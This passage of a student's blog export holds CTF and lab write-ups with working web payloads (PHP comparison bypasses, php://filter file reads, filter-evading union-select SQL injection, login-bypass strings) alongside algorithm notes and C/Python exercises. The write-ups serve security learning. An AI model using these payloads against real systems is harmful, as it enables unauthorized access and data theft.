noother_says_correct($temp)&#123;$flag = 'flag&#123;test&#125;';$one = ord('1'); //ord — 返回字符的 ASCII 码值$nine = ord('9'); //ord — 返回字符的 ASCII 码值$number = '3735929054';// Check all the input characters!for ($i = 0; $i &lt; strlen($number); $i++)&#123;// Disallow all the digits!$digit = ord($temp&#123;$i&#125;);if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;// Aha, digit not allowed!return "flase";&#125;&#125;if($number == $temp)return $flag;&#125;$temp = $_GET['password'];echo noother_says_correct($temp);?&gt; 根据题目提示，把3735929054转为16进制0xdeadc0de，发现刚好绕过。1payload: password=0xdeadc0de ereg正则%00截断http://123.206.87.240:9009/5.php1234567891011121314151617181920212223242526272829303132333435&lt;?php$flag = "xxx";if (isset ($_GET['password']))&#123;if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)&#123;echo 'You password must be alphanumeric';&#125;else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999)&#123;if (strpos ($_GET['password'], '*-*') !== FALSE) //strpos — 查找字符串首次出现的位置&#123;die('Flag: ' . $flag);&#125;else&#123;echo('- have not been found');&#125;&#125;else&#123;echo 'Invalid password';&#125;&#125;?&gt; 科学计数法+%00截断绕过ereg,%00算一个字符。还有就是数组也可以绕过。。。1payload: password=1e9%00*-* 或password[]=1 strpos数组绕过http://123.206.87.240:9009/15.php1234567891011&lt;?php$flag = "flag";if (isset ($_GET['ctf'])) &#123;if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)echo '必须输入数字才行';else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)die('Flag: '.$flag);elseecho '骚年，继续努力吧啊~';&#125;?&gt; 两个函数遇见数组都返回NULL，就都绕过了。1payload: ctf[]=1]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali安装docker]]></title>
    <url>%2F2019%2F04%2F19%2Fkali%E5%AE%89%E8%A3%85docker%2F</url>
    <content type="text"><![CDATA[第一步123456apt-get updateapt-get install -y apt-transport-https ca-certificatesapt-get install dirmngr 第二步123456apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609Decho &apos;deb https://apt.dockerproject.org/repo debian-stretch main&apos; &gt; /etc/apt/sources.list.d/docker.list 第三步1234apt-get updateapt-get install docker-engine]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[西湖论剑2019]]></title>
    <url>%2F2019%2F04%2F07%2F%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912019%2F</url>
    <content type="text"><![CDATA[CRYPTO哈夫曼之谜123456789101111000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110a:4d:9g:1f:5l:10:75:9&#123;:1&#125;:1 123456import huffmanimport collectionst1=huffman.codebook([('a', 4), ('d', 9), ('g', 1), ('f', 5),('l', 1),('0', 7),('5', 9),('&#123;', 1),('&#125;', 1)])print(t1)#&#123;'a': '000', 'd': '10', 'g': '00100', 'f': '110', 'l': '00101', '0': '111', '5': '01', '&#123;': '00111', '&#125;': '00110'&#125;#得到f&#123;algddf5dfd0f05550500a5af55dd0d5d0ad&#125;，权重一样的位置可以交换，最后提交ddf5dfd0f05550500a5af55dd0d5d0ad成功 #babyt3http://ctf1.linkedbyx.com:10300首页发现是任意文件读取，然后又看到hint，base64解码得到dir.php,然后用php伪协议读取dir.php，再base64解码payload:1http://ctf1.linkedbyx.com:10300/?file=php://filter/read=convert.base64-encode/resource=dir.php 得到源码123456&lt;?php$a = @$_GET['dir'];if(!$a)&#123;$a = '/tmp';&#125;var_dump(scandir($a)); scandir() 函数返回指定目录中的文件和目录的数组,再同级和上级目录都试试，发现上级目录是存在文件的payload：1http://ctf1.linkedbyx.com:10300/dir.php?dir=/.. 返回目录信息1array(25) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(4) &quot;boot&quot; [5]=&gt; string(3) &quot;dev&quot; [6]=&gt; string(3) &quot;etc&quot; [7]=&gt; string(16) &quot;ffffflag_1s_Her4&quot; [8]=&gt; string(4) &quot;home&quot; [9]=&gt; string(3) &quot;lib&quot; [10]=&gt; string(5) &quot;lib64&quot; [11]=&gt; string(5) &quot;media&quot; [12]=&gt; string(3) &quot;mnt&quot; [13]=&gt; string(7) &quot;my_init&quot; [14]=&gt; string(10) &quot;my_service&quot; [15]=&gt; string(3) &quot;opt&quot; [16]=&gt; string(4) &quot;proc&quot; [17]=&gt; string(4) &quot;root&quot; [18]=&gt; string(3) &quot;run&quot; [19]=&gt; string(4) &quot;sbin&quot; [20]=&gt; string(3) &quot;srv&quot; [21]=&gt; string(3) &quot;sys&quot; [22]=&gt; string(3) &quot;tmp&quot; [23]=&gt; string(3) &quot;usr&quot; [24]=&gt; string(3) &quot;var&quot; &#125; 发现ffffflag_1s_Her4，再读取就好了，得到flagpayload：1http://ctf1.linkedbyx.com:10300/?file=/ffffflag_1s_Her4]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pragyan CTF19 webwp]]></title>
    <url>%2F2019%2F03%2F10%2FPragyan-CTF19-webwp%2F</url>
    <content type="text"><![CDATA[Cookie Monster 100Do prepare to see cookies lurking everywhere. http://159.89.166.12:13500/12345678910111213141516171819202122import requestsimport hashlibfrom itertools import *import stringflag = []wordlist = string.printables = requests.session()for i in range(40): cookie = s.get('http://159.89.166.12:13500/').cookies['flag'] flag.append(cookie)print (flag)result= []for i in flag: for j in permutations(wordlist,2): guess = "".join(j) md5 = hashlib.md5(guess.encode("utf8")).hexdigest() if md5 ==i: result.append(guess) breakprint (result) Game of Faces 100The Game of Faces, welcomes you. In this era, where AIs generate a lot of faces, we would like you to contribute to the same by uploading your image. Thank you for contributing, to continue. http://159.89.166.12:15000/12把css删掉，发现一个假的提交，得到一个base64，解码得The_scroll_says=the_night_kingVSvalyrian.txt，然后直接访问。。。http://159.89.166.12:15000/the_night_kingVSvalyrian.txt Mandatory PHP 125PHP, PHP everywhere get the flag and earn your points there. http://159.89.166.12:14000/ 12345678910111213141516171819202122232425262728293031&lt;?php include 'flag.php'; highlight_file('index.php'); $a = $_GET["val1"]; $b = $_GET["val2"]; $c = $_GET["val3"]; $d = $_GET["val4"]; if(preg_match('/[^A-Za-z]/', $a)) die('oh my gawd...'); $a=hash("sha256",$a); $a=(log10($a**(0.5)))**2; //传入 $a='pp';会发现 float(INF) phpif($c&gt;0&amp;&amp;$d&gt;0&amp;&amp;$d&gt;$c&amp;&amp;$a==$c*$c+$d*$d) //这里也传入无限大$s1="true"; else die("Bye..."); if($s1==="true") echo $flag1; for($i=1;$i&lt;=10;$i++)&#123; if($b==urldecode($b)) //编码11次 die('duck'); else $b=urldecode($b); &#125; if($b==="WoAHh!") $s2="true"; else die('oops..'); if($s2==="true") echo $flag2; die('end...'); ?&gt; payload: http://159.89.166.12:14000/?val1=pp&amp;val2=WoAHh%2525252525252525252521&amp;val3=1&amp;val4=100000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000]]></content>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku速度要快wp]]></title>
    <url>%2F2018%2F12%2F10%2Fbugku%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%ABwp%2F</url>
    <content type="text"><![CDATA[http://123.206.87.240:8002/web6/这道题我首先在headers里发现flag，base64解码然后提交失败，发现是需要post得到的数据，然后试了半天都不对，结果发现需要post的是两次解码后的得到的数字。。。无语，上代码 1234567891011121314151617import reimport requestsimport base64url='http://123.206.87.240:8002/web6/'s = requests.Session()#创建session对象，保存Cookie值r = s.get(url)'''txt1 = re.search("flag': '(.*?)',",str(r.headers),re.S)txt2=re.search(".*?: (.*?)'",str(base64.b64decode(txt1.group(1))),re.S)这个是我刚开始绕的弯路,基础功不扎实'''txt1=r.headers['flag']txt2=re.search(".*?: (.*?)'",str(base64.b64decode(txt1)),re.S)flag=base64.b64decode(txt2.group(1))d=&#123;"margin":flag&#125;print(s.post(url,data=d).text)]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nctf打卡题]]></title>
    <url>%2F2018%2F11%2F27%2Fnctf%E6%89%93%E5%8D%A1%E9%A2%98%2F</url>
    <content type="text"><![CDATA[我果真是太菜了，nctf只做出了web签到题和re签到题外加打了一个i wanna，连web的sql注入签到都没有做出来，在看了一位大佬的write up后，感觉收获很多。http://ctfgame.acdxvfsvd.net:20001/首先学到了空格的过滤绕过：1%20 %09 %0a %0b %0c %0d %a0 %00 /**/ () 发现过滤了截断符号%23,#,–+，只要在语句最后在加个单引号使其闭合就可以了，’’空的也可以执行，就不用用注释了。然后大佬提到’必须直接跟在select后。123?id=1'' 查询:select * from user where id='1''' LIMIT0,1 可以?id=1' and 1=1' 查询:select * from users where id='1' and 1=1'' LIMIT 0,1 不可以id=-1' union select 1,2,3' 可以 然后用子查询进行操作,select * from user where id=’-1’ union select (select group_concat(schema_name) from information_schema.schemata),2,3’，这样就行了。1234http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),2,3%27爆数据库名，应该是这个flaaaaaaag数据库。http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=%27flaaaaaaag%27),2,3%27爆表名，f144444444ghttp://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=%27f144444444g%27),2,3%27爆列名，th1s_1s_flaghttp://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(select%a0th1s_1s_flag%a0from%a0flaaaaaaag.f144444444g),2,3%27查询到flag 收获很多。]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[11.15]]></title>
    <url>%2F2018%2F11%2F15%2F11-15%2F</url>
    <content type="text"><![CDATA[这几天又开始学前端了，准备和活动室里两个大佬合伙做院科协的网页设计活动，真的很忙呀！！！然后昨天郁师傅推荐了一个上传漏洞的靶场https://github.com/c0ny1/upload-labs，于是我又要学php了，得学会php的代码审计吧！！！]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[铺地毯问题]]></title>
    <url>%2F2018%2F11%2F04%2F%E9%93%BA%E5%9C%B0%E6%AF%AF%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[这道题我进坑了，我看到这个题的第一反应就是定义一个二维数组模拟坐标系，按顺序把地毯数存进覆盖的坐标中。然后我就看到内存达到128000KB，下载输入测试文件，发现了10000个地毯数据QAQ~!!刚开始的代码12345678910111213141516171819202122232425#include &lt;stdio.h&gt;int array[10001][10001]=&#123;0&#125;;int main ()&#123; int x,y,a,b,g,h; int n; scanf("%d",&amp;n); for(int i=1;i&lt;=n;i++) &#123; scanf("%d %d %d %d",&amp;a,&amp;b,&amp;g,&amp;h); for(int j=a;j&lt;=a+g;j++)//把地毯覆盖的点赋值 &#123; for(int k=b;k&lt;=b+h;k++) &#123; array[j][k]=i; &#125; &#125; &#125; scanf("%d %d",&amp;x,&amp;y); if(array[x][y]==0) &#123; printf("-1"); &#125;else printf("%d",array[x][y]); return 0;&#125; 然后我就去看下大佬是怎么解决的，瞬间就明白了，微笑，默叹，以为妙绝。正确思路应该是这样的，定义一个数组，按顺序保存地毯四个角的坐标，再逆序判断给定点是否在地毯内就行了。改写代码如下，顺利AC，收获挺大的。1234567891011121314151617181920212223#include &lt;stdio.h&gt;int a[10001][5];int main()&#123; int x,y,n; scanf("%d",&amp;n); for(int i=1;i&lt;=n;i++) &#123; scanf("%d %d %d %d",&amp;a[i][1],&amp;a[i][2],&amp;a[i][3],&amp;a[i][4]); a[i][3]+=a[i][1]; a[i][4]+=a[i][2]; &#125;//数组只是用来记录第i个地毯的四个点的坐标 scanf("%d %d",&amp;x,&amp;y); for(int i=n;i&gt;=1;i--)//逆序判断地毯是否覆盖（x，y） &#123; if(a[i][1]&lt;=x&amp;&amp;a[i][2]&lt;=y&amp;&amp;a[i][3]&gt;=x&amp;&amp;a[i][4]&gt;=y) &#123;printf("%d",i); return 0; &#125; &#125; printf("-1");//没有则输出-1 return 0;&#125;]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[尝试简单的sql注入]]></title>
    <url>%2F2018%2F11%2F02%2F%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[感觉有点汗颜，因为线代、高数，以及我萌生了想学算法的念头，导致我没时间学习安全，今天下午没课我就练了几道简单的sql注入题。说来都是巧合，昨天我们c语言老师推荐了第四版的《加密与解密》，今天我就望着价钱瑟瑟发抖，然后看见这本书是由看雪论坛的大神写的，所以机缘巧合就看到了这个帖子。https://bbs.pediy.com/thread-218653.htm这个帖子里提供了几个云靶机。我就选择了OWASP Bricks练手(我是菜鸟),这是地址http://43.247.91.228:83/login-pages.html第一题在username输入以下语句都可以，只要让引号闭合并使语句成立就行，比如可以在后面加#，注释掉后面的语句123451' or 1 #1' or 1 or '' or 1 #' or 1 or '1' or 1=1 # 第二题发现使用了js验证，加了黑名单禁止输入特殊字符。可以右键查看源代码看看js代码，然后打开开发者工具在console里修改该js函数，再使用注入语句就行了。 第三题发现它在两边加入了括号()，所以只要构造语句使括号闭合就行。121') or 1 #1') or 1 or(' 第四题和第三题差不多，只不过使用双引号””包裹字符串。121") or 1 #1") or 1 or (" 第五题直接用第一题的语句注入，发现返回了输入密码的MD5值，虽然我不知道这是干什么的。 第六题我也不知道是干啥的，可以直接注入，我搜了下题目名automatic redirect 叫自动重定向。我再问问大佬这是啥。]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法上的一些术语]]></title>
    <url>%2F2018%2F11%2F02%2F%E7%AE%97%E6%B3%95%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9C%AF%E8%AF%AD%2F</url>
    <content type="text"><![CDATA[我发现了一个较严重问题，就是听不懂大佬说的一些名词，感受到了莫名的恐惧？？？于是我从网上找了一些术语，写在这里。 OJ平台 简写 全称 中文称谓 OJ Online Judge 在线判题系统 AC Accepted 通过 WA Wrong Answer 答案错误 TLE Time Limit Exceed 超时 OLE Output Limit Exceed 超过输出限制 MLE Memory Limit Exceed 超内存 RE Runtime Error 运行时错误 PE Presentation Error 格式错误 CE Compile Error 无法编译 算法常用术语英中对照 英语 中文 Approximate String Matching 模糊匹配 Arbitrary Precision Arithmetic 高精度计算 Bandwidth Reduction 带宽压缩 Bin Packing 装箱问题 Calendrical Calculations 日期 Clique 最大团 Combinatorial Problems 组合问题 Computational Geometry 计算几何 Connected Components 连通分支 Constrained and Unconstrained Optimization 最值问题 Convex Hull 凸包 Cryptography 密码 Data Structures 基本数据结构 Determinants and Permanents 行列式 Dictionaries 字典 Discrete Fourier Transform 离散Fourier变换 Drawing Graphs Nicely 图的描绘 Drawing Trees 树的描绘 Edge and Vertex Connectivity 割边/割点 Edge Coloring 边染色 Eulerian Cycle / Chinese Postman Euler 回路/中国邮路 Factoring and Primality Testing 因子分解/质数判定 Feedback Edge/Vertex Set 最大无环子图 Finite State Machine Minimization 有穷自动机简化 Generating Graphs 图的生成 Generating Partitions 划分生成 GeneratingPermutations 排列生成 GeneratingSubsets 子集生成 Graph Data Structures 图形数据结构 Graph Isomorphism 图同构 Graph Partition 图的划分 Graph Problems — hard 图论-NP问题 Graph Problems — polynomial 图论-多项式算法 Hamiltonian Cycle Hamilton 回路 Independent Set 独立集 Intersection Detection 碰撞测试 Job Scheduling 工程安排 Kd-Trees 线段树 Knapsack Problem 背包问题 Linear Programming 线性规划 Longest Common Substring 最长公共子串 Maintaining Line Arrangements 平面分割 Matching 匹配 Matrix Multiplication 矩阵乘法 Medial-Axis Transformation 中轴变换 Median and Selection 中位数 Minimum Spanning Tree 最小生成树 Minkowski Sum Minkowski和 Motion Planning 运动规划 Nearest Neighbor Search 最近点对查询 Network Flow 网络流 Numerical Problems 数值问题 Planarity Detection and Embedding 平面性检测和嵌入 Point Location 位置查询 Polygon Partitioning 多边形分割 Priority Queues 优先队列 Random Number Generation 随机数生成 Range Search 范围查询 rate of convergence 收敛速度 robustness 鲁棒性 Satisfiability 可满足性 Searching 查找 Set and String Problems 集合与串的问题 Set Cover 集合覆盖 Set Data Structures 集合 Shape Similarity 相似多边形 Shortest Common Superstring 最短公共父串 Shortest Path 最短路径 Simplifying Polygons 多边形化简 Solving Linear Equations 线性方程组 Sorting 排序 Steiner Tree Steiner树 String Matching 模式匹配 Text Compression 压缩 Topological Sorting 拓扑排序 Transitive Closure and Reduction 传递闭包 Traveling Salesman Problem 旅行商问题 Triangulation 三角剖分 Vertex Coloring 点染色 Vertex Cover 点覆盖 Voronoi Diagrams Voronoi图]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>术语</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[过河卒问题]]></title>
    <url>%2F2018%2F11%2F01%2F%E8%BF%87%E6%B2%B3%E5%8D%92%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[学长给我安利洛谷平台，我打算开始做题然后提升，结果我做过河卒这个题就做了一天。刚开始写的程序有一些逻辑上的漏洞，测试时不能全部通过，曹老板告诉我可以下载测试数据来看，然后就找到漏洞所在，再一个一个的完善，做出来后还是很开心的。 我的心路历程首先可以发现到达当前坐标的路径数等于左边和上边路径数之和，然后我就想构造二维数组，用遍历的方法，把每一个坐标都算出来。在此之前，我需要把第0行第0列赋值为1，也需要判断马控制的坐标(马走日)在不在数组内，并赋值为0，在循环的时候写判断跳过控制点即可。我的方法就是这么复杂，以至于我刚开始漏掉好多判断条件，比如说当马控制点落在第0行或第0列时，控制点之后都将为0。当我看题解的时候，发现一堆我看不懂的名词，什么动态规划dp，什么滚动数组，还有用递归的方法做。我这个渣渣还是遍历就好了，等我再学一段时间，再来看会不会这些方法，并写进来。 我的代码先附上我的遍历方法，学会更好的方法再补充。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;stdio.h&gt;long long a[21][21];int define_horse_control1(long long array[21][21],int x,int y)//定义一个函数，把马控制的点赋为0&#123; array[x][y]=0; if(x-2&gt;=0&amp;&amp;y-1&gt;=0)array[x-2][y-1]=0;//这里都要判断一下有没有越界 if(x-2&gt;=0&amp;&amp;y+1&lt;=20)array[x-2][y+1]=0; if(x-1&gt;=0&amp;&amp;y-2&gt;=0)array[x-1][y-2]=0; if(x+1&lt;=20&amp;&amp;y-2&gt;=0)array[x+1][y-2]=0; if(x+2&lt;=20&amp;&amp;y-1&gt;=0)array[x+2][y-1]=0; if(y+1&lt;=20&amp;&amp;x+2&lt;=20)array[x+2][y+1]=0; if(x-1&gt;=0&amp;&amp;y+2&lt;=20)array[x-1][y+2]=0; if(x+1&lt;=20&amp;&amp;y+2&lt;=20)array[x+1][y+2]=0; return array[21][21]; &#125;int define_horse_control2(long long array[21][21],int x,int y,int n,int m)//如果马的控制点在第0行或者第0列，在马控制点以后的值全为0&#123; if(x-2==0) &#123; if(y-1&gt;=1) &#123; for(int i=y-1;i&lt;=n;i++)a[0][i]=0; &#125;else &#123;for(int i=y+1;i&lt;=n;i++)a[0][i]=0;&#125; &#125; if(x-1==0) &#123; if(y-2&gt;=1) &#123; for(int i=y-2;i&lt;=n;i++)a[0][i]=0; &#125;else&#123;for(int i=y+2;i&lt;=n;i++)a[0][i]=0;&#125; &#125; if(x==0) &#123; for(int i=y;i&lt;=n;i++)a[0][i]=0; &#125; if(y-1==0) &#123; if(x-2&gt;=1) &#123; for(int i=x-2;i&lt;=m;i++)a[i][0]=0; &#125;else&#123;for(int i=x+2;i&lt;=m;i++)a[i][0]=0;&#125; &#125; if(y-2==0) &#123; if(x-1&gt;=1) &#123; for(int i=x-1;i&lt;=m;i++)a[i][0]=0; &#125;else&#123;for(int i=x+1;i&lt;=m;i++)a[i][0]=0;&#125; &#125; if(y==0) &#123; for(int i=x;i&lt;=m;i++)a[i][0]=0; &#125;&#125;int main()&#123; int m,n,x,y; scanf("%d %d %d %d",&amp;m,&amp;n,&amp;x,&amp;y); a[0][0]=0; for(int i=1;i&lt;=n;i++)a[0][i]=1;//到达第一行第一列的点都只有一条路径，都赋值为1 for(int i=1;i&lt;=m;i++)a[i][0]=1;//到达第一行第一列的点都只有一条路径，都赋值为1 define_horse_control1(a,x,y);//把马控制的点赋为0 define_horse_control2(a,x,y,n,m);//如果马的控制点在第0行或者第0列，在马控制点以后的值全为0 for(int i=1;i&lt;=m;i++)//遍历计算到当前坐标的路径数，只需要遍历到第m行和第n列即可。 &#123; for(int j=1;j&lt;=n;j++) &#123; if((i==x-2&amp;&amp;j==y-1)||(i==x-2&amp;&amp;j==y+1)||(i==x-1&amp;&amp;j==y-2)||(i==x+1&amp;&amp;j==y-2)||(i==x+2&amp;&amp;j==y-1)||(j==y+1&amp;&amp;i==x+2)||(i==x-1&amp;&amp;j==y+2)||(i==x+1&amp;&amp;j==y+2)||(i==x&amp;&amp;j==y)) &#123; continue;//跳过马的控制点的计算 &#125; a[i][j]=a[i][j-1]+a[i-1][j];//当前坐标的路径数等于左边和上边路径数之和 &#125; &#125; printf("%lld",a[m][n]); return 0;&#125;]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[排序]]></title>
    <url>%2F2018%2F10%2F30%2F%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[c刚看到数组，只会写个简单的冒泡排序。发现自己还真是菜，抱着ljr老师的算法书半天都看不懂，没办法只能自己慢慢啃了。 算法原理(摘自百度百科) 比较相邻的元素。如果第一个比第二个大，就交换他们两个。 对每一对相邻元素做同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该会是最大的数。 针对所有的元素重复以上的步骤，除了最后一个。 持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。 下面用python实现12345678def bubble_sort(nums): n = len(nums) for i in range(1,n): # n个数，比较n-1趟 for j in range(n - i):#n个数，去掉最后面排好序的(i-1)个数，剩余n-i+1个数比较n-1次，[0,n-i-1]每次判断到下标j=n-1-i即可，因为前闭后开，所以要+1 if nums[j] &gt; nums[j + 1]: nums[j], nums[j + 1] = nums[j + 1], nums[j] return numsprint(bubble_sort([1,4,5,3])) 下面用c实现12345678910111213141516171819202122#include&lt;stdio.h&gt;#define maxn 100000int a[maxn];int main()&#123; int x,n=0; while(scanf("%d",&amp;x)==1) a[n++]=x;//最后一次n又加1,所以,数组下标0到n-1 ,n个数 for(int i=1;i&lt;=n-1;i++)//n个数,比较(n-1)趟 &#123; for(int j=0;j&lt;=n-i-1;j++)//n个数,去掉最后面(i-1)个数,剩余n-i+1个数比较n-i次.每次判断到下标j=n-1-i即可 &#123; if(a[j]&gt;a[j+1]) &#123; a[j] = a[j]+a[j+1]; a[j+1] = a[j]-a[j+1]; a[j]=a[j]-a[j+1]; &#125; &#125; &#125; for(int i=0;i&lt;=n-1;i++)printf("%d ",a[i]); return 0; &#125; 学会选择法排序了123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;void sort(int *pa,int n)&#123; int index,i,k,temp; for(k=0;k&lt;n-1;k++) &#123; index=k; for(i=k+1;i&lt;n;i++) &#123; if(pa[i]&lt;pa[index])index=i; &#125; if(index!=k) &#123; temp=pa[index]; pa[index]=pa[k]; pa[k]=temp; &#125; &#125; &#125;int main()&#123; int n,i; scanf("%d",&amp;n); int a[n]; for(i=0;i&lt;=n-1;i++)scanf("%d",&amp;a[i]); sort(a,n); for(i=0;i&lt;=n-1;i++)printf("%d ",*(a+i)); return 0;&#125;]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>算法</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[埃氏筛法筛素数]]></title>
    <url>%2F2018%2F10%2F27%2F%E5%9F%83%E6%B0%8F%E7%AD%9B%E6%B3%95%E7%AD%9B%E7%B4%A0%E6%95%B0%2F</url>
    <content type="text"><![CDATA[昨天实验课上，当我判断质数还在用取模方法的时候，打ACM的大佬刁老板对我说出埃氏筛，随后回到宿舍开始查，到现在整理完思路已经凌晨1点，在瑟瑟发抖中写下这篇博客。 埃拉托斯特尼筛法，简称埃氏筛或爱氏筛，是一种由希腊数学家埃拉托斯特尼所提出的一种简单检定素数的算法。要得到自然数n以内的全部素数，必须把不大于根号n的所有素数的倍数剔除，剩下的就是素数。下面用python实现12345678910111213141516171819202122232425262728def JudgePrimes(n): primes = [] f = [] for i in range(n+1):#这样写，可以把自然数和列表元素的序号对应起来。 if i &gt; 2 and i%2 == 0:#把从0到n的偶数筛掉。 f.append(0) else: f.append(1) i = 3 while i*i &lt;= n: #把不大于根号n的所有质数的倍数剔除,剩下的就是质数 if f[i] == 1:#判断是不是质数，若是质数，则筛掉其倍数 j = 2*i while j&lt;=n:#把小于n的所有质数的倍数都筛掉 f[j] = 0 j += i i += 2 primes.append(2)#2是质数 for x in range(3,n+1): if f[x] == 1: primes.append(x) return primes n = int(input("请输入大于1的正整数n："))primes = JudgePrimes(n)print (primes) 算法可以进一步优化123456789101112131415161718192021222324252627def JudgePrimes(n): primes = [] f = [] for i in range(n+1): if i &gt; 2 and i%2 == 0: f.append(0) else: f.append(1) i = 3 while i*i &lt;= n: #把不大于根号n的所有质数的倍数剔除,剩下的就是质数 if f[i] == 1:#判断是不是质数，若是质数，则筛掉其倍数 j = i*i #直接从质数的平方后开始筛，因为质数的平方之前的数已经被上一个质数筛过了，此时j为奇数 while j &lt;= n: f[j] = 0 j += 2*i #如果只加一个i,j则为i的偶数倍是一个偶数已经被筛过了，所以加2个i筛掉i的奇数倍，小优化。 i += 2 primes.append(2)#2是质数 for x in range(3,n+1,2):#步长为2，把偶数跳过,小优化。 if f[x] == 1: primes.append(x) return primes n = int(input("请输入大于1的正整数n："))primes = JudgePrimes(n)print (primes) 我的c语言抠脚，下面放上照着python写的c程序1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;int main()&#123; int n,j; scanf("%d",&amp;n); int f[n+1]; for(int i=0;i&lt;=n;i++) &#123; if(i&gt;2&amp;&amp;i%2==0)f[i]=0; else f[i]=1; &#125; int i =3; while(i*i&lt;=n) &#123; if(f[i] ==1) &#123; j=i*i; while (j&lt;=n) &#123; f[j]=0; j+=2*i; &#125; &#125; i+=2; &#125; f[2]=1; printf("2 "); for(int k=3;k&lt;=n;k+=2) &#123; if(f[k]==1)printf("%d ",k); &#125; return 0;&#125; 然后我学到教材指针这部分，看见教材给了动态一维数组筛选法的例子。1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; int i,j,n; int *s; do &#123; printf("Please input n:\n"); scanf("%d",&amp;n); &#125; while (n&lt;=0); s=(int*) calloc(n+1,sizeof(int)); if(s==NULL) &#123; printf("allocation failure"); exit(1); &#125; s[0]=s[1]=1; for(i=2;i&lt;=n;i++) &#123; if(s[i]==0) &#123; for(j=2*i;j&lt;n+1;j+=i)s[j]=1; &#125; &#125; for(i=0;i&lt;=n;i++) &#123; if(!s[i])printf("%5d",i); &#125; free(s); return 0;&#125;]]></content>
      <categories>
        <category>算法竞赛学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取猫眼电影top100]]></title>
    <url>%2F2018%2F10%2F26%2F%E7%88%AC%E5%8F%96%E7%8C%AB%E7%9C%BC%E7%94%B5%E5%BD%B1top100%2F</url>
